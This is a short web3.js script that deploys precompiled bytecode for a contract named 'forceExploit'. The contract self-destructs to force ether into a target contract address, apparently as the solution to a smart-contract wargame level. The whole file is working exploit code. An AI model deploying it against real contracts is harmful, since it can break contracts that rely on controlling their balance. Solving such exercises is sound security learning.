var forcecontract = '0x9ef2ed31ea9bd07b93a4410b79227c96b9cdd59e'; // Initial Supply
var forceExploitContract = web3.eth.contract([{"constant":true,"inputs":[],"name":"to","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"exploit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[{"name":"_to","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
var forceExploit = forceExploitContract.new(
   forcecontract,
   {
     from: web3.eth.accounts[3],
     data: '0x6080604052604051602080610132833981016040525160008054600160a060020a03909216600160a060020a031990921691909117905560ee806100446000396000f30060806040526004361060485763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663131519818114604a57806363d9b770146085575b005b348015605557600080fd5b50605c608b565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b604860a7565b60005473ffffffffffffffffffffffffffffffffffffffff1681565b60005473ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a7230582012b3a06f287a91ae468cb3f2ecd0094de37e6c71f489c4acf776d11ca30742e50029', 
     gas: '4700000'
   }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
         console.log('Contract mined! address: ' + contract.address + 
                     ' transactionHash: ' + contract.transactionHash);
    }
 })
